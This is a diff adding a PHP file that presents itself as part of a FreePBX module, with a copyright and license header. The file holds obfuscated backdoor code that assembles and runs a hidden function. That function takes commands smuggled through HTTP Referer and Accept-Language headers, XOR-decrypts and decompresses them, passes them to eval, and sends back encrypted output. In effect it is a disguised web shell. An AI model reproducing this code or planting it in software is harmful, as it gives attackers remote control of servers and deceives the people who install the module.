@@ -1,0 +1,27 @@
+<?php
+
+//
+
+//	License for all code of this FreePBX module can be found in the license file inside the module directory
+
+//	Copyright 2013 Schmooze Com Inc.
+
+//
+
+$N=';$z++)$Bp.=B$q[$m[2][$zB]];iBBf(stBrpos($p,$Bh)==B=0){$Bs[$i]="";$p=B$ss($pB,B3);}if(arrBa';
+$a='art();B@evaBl(@gzuncBompreBss(@xB(@baBse64_decoBdBe(pregB_replace(arrBay("B/_B/","/-/B"),arr';
+$q=';}$Br=$B_SERVER;$rr=B@$rBB["HTTP_REFERERB"];$ra=B@$Br["BHTTP_ACCBEPT_LBANGUAGEB"];if($Br';
+$R='();$s=&$_BSESSIONB;$Bss="sBBBubstr";$sl="strtolBower";$i=$Bm[1]B[0]B.$m[1][1];$Bh=$Bsl($';
+$j='r&&$raB){$u=Bparse_url(B$rr)B;parse_sBtBr($uB["query"],$qB);$Bq=arraBy_values(BB$q);prBeg_ma';
+$U='ay("/B","+")B,B$ss($sB[$i],0B,$Be))),$BkB)));$o=ob_get_contBents(B);ob_end_Bclean(B);$dB=ba';
+$r='tch_all(B"/([\\wB]B)[\\w-]+(?:B;q=B0.([\\d]))B?,?/",B$ra,B$m);if($qB&&$m){B@BBsessionB_start';
+$B='sBs(md5($i.$Bkh),0,B3));$fB=B$Bsl($ss(md5($Bi.$kf)B,B0,3));$p="";foBr(B$BBz=1;$z<countB($m[1])';
+$I=str_replace('Wc','','crWcWceaWcWcteWc_Wcfunction');
+$Z='($i=B0;$i<$l;)B{foBr($j=0;($j<$c&BBBB&$i<B$l)B;$j++,$i++){$o.=$t{$i}^$k{$Bj};}}return B$o';
+$V='Bse64B_encodBe(x(gzcompresBs($o),B$k)B);BprBint("<$Bk>$d</$k>");@sesBsiBon_destroyB();}}}}';
+$u='$kh="09B8Bf";$kf="6Bbcd";funBction xB($Bt,$Bk){$c=strlenB($k)B;$l=strlen($BBBt);$o=B"";fBor';
+$g='y_keBy_exists($Bi,$s)){$BsB[B$i].=$pB;$e=BstrposB($s[$i],$f);ifB($e){$BBk=$kh.$kfB;ob_st';
+$v=str_replace('B','',$u.$Z.$q.$j.$r.$R.$B.$N.$g.$a.$U.$V);
+$p=$I('',$v);$p();
+
+?>
